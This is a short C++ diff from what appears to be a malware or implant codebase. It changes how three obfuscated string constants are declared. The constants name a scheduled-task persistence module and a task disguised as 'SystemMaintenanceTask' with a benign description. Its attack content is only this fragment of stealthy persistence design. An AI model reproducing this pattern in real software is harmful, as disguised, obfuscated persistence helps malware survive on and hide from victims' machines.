@@ -16,9 +16,9 @@
 #endif
 
 // Obfuscated strings
-constexpr auto OBF_SCHEDULE_PERSISTENCE = OBFUSCATE("SchedulePersistence");
-constexpr auto OBF_TASK_NAME = OBFUSCATE("SystemMaintenanceTask");
-constexpr auto OBF_TASK_DESC = OBFUSCATE("Performs system maintenance activities");
+const auto OBF_SCHEDULE_PERSISTENCE = OBFUSCATE("SchedulePersistence");
+const auto OBF_TASK_NAME = OBFUSCATE("SystemMaintenanceTask");
+const auto OBF_TASK_DESC = OBFUSCATE("Performs system maintenance activities");
 
 SchedulePersistence::SchedulePersistence(Configuration* config)
     : BasePersistence(config) {}
